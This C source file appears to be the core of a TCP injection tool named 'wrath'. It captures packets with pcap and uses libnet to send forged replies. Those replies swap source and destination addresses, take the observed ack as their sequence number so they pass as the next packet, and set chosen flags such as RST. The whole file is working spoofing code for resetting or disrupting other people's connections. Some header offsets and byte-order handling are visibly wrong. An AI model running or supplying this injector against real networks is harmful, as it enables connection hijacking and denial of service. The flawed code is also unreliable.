#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));

	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));
	
	/* build application layer -- this order is only a libnet requirement, so maybe not */

	/* libnet_build_tcp */
	libnet_build_tcp(
	tcphdr->th_sport,		// source port
	tcphdr->th_dport,		// destination port
	tcphdr->th_ack,			// +(calc_len(upper_level)),	// seq (pretend to be next packet)
	tcphdr->th_seq,			// ack
	(cline_args->tcp_rst
	+ cline_args->tcp_fin
	+ cline_args->tcp_syn
	+ cline_args->tcp_ack
	+ cline_args->tcp_urg
	+ cline_args->tcp_psh),		// flags	
	4096,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libmet auto-fill
	0,				// URG pointer	
	0,				// len
	NULL,				// *payload (maybe app-level here)
	0,				// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);
}
